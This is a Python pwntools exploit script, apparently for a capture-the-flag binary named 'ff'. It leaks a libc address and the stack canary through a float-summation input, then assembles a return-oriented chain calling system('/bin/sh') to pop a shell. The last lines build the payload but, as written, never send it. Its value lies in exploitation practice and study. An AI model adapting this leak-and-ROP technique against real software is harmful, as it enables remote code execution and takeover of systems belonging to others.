from pwn import *
from decimal import Decimal
import struct

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
elf= context.binary = ELF('./ff',checksec=False)
p = process(elf.path)
context.terminal = "tmux splitw -h".split(" ")

local = 1
#g = "b * sum"
if local:
    g = "b* sum"
    gdb.attach(p, gdbscript=g)

uf = lambda x: u64(struct.pack("<d",float.fromhex(x)))
pd = lambda x: str(Decimal(struct.unpack("<d",p64(x))[0]))

def leak(x):
    p.sendlineafter(b": ", str(x).encode())
    for i in range(x-1):
        p.sendlineafter(b": ", str(0).encode())
    p.sendlineafter(b": ", b"-")
    p.recvuntil(b"Result: ")
    res = p.recvline().strip()[:-4]
    return uf(res.decode())

def rop(x):
    p.sendlineafter(b": ", str(65 + len(x)).encode())
    for i in range(65):
        p.sendlineafter(b": ", str(0).encode())

    for i in x:
        p.sendlineafter(b": ", pd(i).encode())


libc.address = leak(50) - libc.sym["_IO_2_1_stderr_"]
pop_rdi = libc.search(asm("pop rdi; ret")).__next__()

canary = leak(66)

pay = [
    canary,
    0,
    pop_rdi+1,
    pop_rdi,
    libc.search(b"/bin/sh\x00").__next__(),
    libc.sym["system"]]

print(pay)
x = 71
p.sendlineafter(b": ", str(x).encode())
for i in range(65):
    p.sendlineafter(b": ", str(0).encode())

p.interactive()
